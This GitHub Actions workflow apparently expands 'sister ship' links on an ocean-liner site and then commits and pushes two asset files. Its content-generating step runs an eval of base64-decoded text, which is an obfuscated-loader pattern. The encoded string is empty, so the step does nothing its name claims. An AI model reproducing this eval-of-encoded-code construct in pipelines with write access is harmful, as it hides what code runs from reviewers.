name: Expand sister ship relationships

on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/expand-related-liners-phase2.yml'

permissions:
  contents: write

jobs:
  expand:
    runs-on: ubuntu-latest
    steps:
      - name: Check out repository
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Add curated sister ship groups
        shell: bash
        run: node -e "eval(Buffer.from('','base64').toString())"

      - name: Commit expansion
        shell: bash
        run: |
          if git diff --quiet -- assets/related-liners-phase2.js assets/nav.js; then
            echo "Sister ship expansion already present."
            exit 0
          fi
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add assets/related-liners-phase2.js assets/nav.js
          git commit -m "Expand curated sister ship relationships [skip ci]"
          git push
